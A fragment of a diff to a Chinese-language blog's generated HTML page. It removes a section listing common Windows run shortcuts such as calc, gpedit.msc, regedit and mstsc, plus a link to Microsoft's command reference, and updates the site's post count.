-<h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mspaint　　画图工具</span><br><span class="line">calc　　计算机</span><br><span class="line">notepad　　记事本</span><br><span class="line">taskmgr　　任务管理器</span><br><span class="line">osk　　打开屏幕键盘</span><br><span class="line">gpedit.msc　　组策略</span><br><span class="line">services.msc　　本地服务</span><br><span class="line">compmgmt.msc　　计算机管理</span><br><span class="line">devmgmt.msc　　设备管理器</span><br><span class="line">winver　　查看系统版本</span><br><span class="line">magnify　　放大镜实用程序</span><br><span class="line">eventvwr　　事件查看器</span><br><span class="line">Regedit　　打开注册表</span><br><span class="line">resmon　　资源监视器</span><br><span class="line">WMIC BIOS get releasedate　　查看电脑生产日期</span><br><span class="line">mstsc -f　　远程连接（可以全屏）</span><br></pre></td></tr></table></figure>
-<h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p>
-<p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noopener">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2538,7 +2661,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">76</span>
+                <span class="site-state-item-count">77</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
